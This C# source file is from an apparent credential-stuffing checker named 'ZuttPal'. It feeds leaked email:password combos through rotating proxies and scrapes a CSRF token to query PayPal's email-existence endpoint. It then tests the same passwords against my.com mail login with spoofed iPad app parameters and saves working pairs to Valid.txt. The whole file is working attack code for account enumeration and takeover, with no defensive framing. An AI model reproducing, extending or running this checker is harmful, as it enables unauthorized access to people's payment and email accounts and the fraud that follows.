﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check18
	{
		public static string Path4;
		public static string Path3;
		public static string Path2;
		public static string Path1;
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker1()
		{
			for (; ; )
			{
				while (!Checking21.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking21.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking21.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								HttpResponse GetRequest = httpRequest.Get("https://www.paypal.com/in/welcome/signup/");
								string text2 = GetRequest.ToString();
								string key = check17.yey(text2, "data-csrf-token=\"", "\"");
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.AllowAutoRedirect = true;
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("Accept", "*/*");
								httpRequest.AddHeader("x-csrf-token", $"{key}");
								string yes = email + ":" + password;
								HttpResponse PostRequest = httpRequest.Post("https://www.paypal.com/welcome/rest/v1/emailExists", "{\"email\":\"" +  email + "\"}", "application/json;charset=UTF-8");
								var post = PostRequest.ToString();
								if (post.Contains("emailExists\":true"))
								{
									if (check18.MailAccessCheck(email, password) == "Working")
									{
										Interlocked.Increment(ref Checking21.CheckedLines);
										Interlocked.Increment(ref Checking21.currentCpm);
										Interlocked.Increment(ref Checking21.Hits);
										string yeaa = account + " Email Access: True";
										if (Program.config.printgood == "True")
										{

											Console.WriteLine("[»] Valid - " + yeaa, Color.Green);
										}
										Save(Path + "\\Valid.txt", yeaa);
										break;
									}
									else
                                    {
										Interlocked.Increment(ref Checking21.CheckedLines);
										Interlocked.Increment(ref Checking21.currentCpm);
										Interlocked.Increment(ref Checking21.Bad);
										if (Program.config.printbad == "True")
										{
											Console.WriteLine("[»] Invalid - " + account, Color.Red); 
										}
										break;
									}
								}
								else if (post.Contains("emailExists\":false"))
								{
									Interlocked.Increment(ref Checking21.CheckedLines);
									Interlocked.Increment(ref Checking21.currentCpm);
									Interlocked.Increment(ref Checking21.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.Red);
									}
									break;
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking21.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking21.retry);
							}
						}
					}
				}
			}
		}
		private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						httpRequest.Proxy = Checking21.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					Interlocked.Increment(ref Checking21.Errors);
				}
			}
			return "";
		}
		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
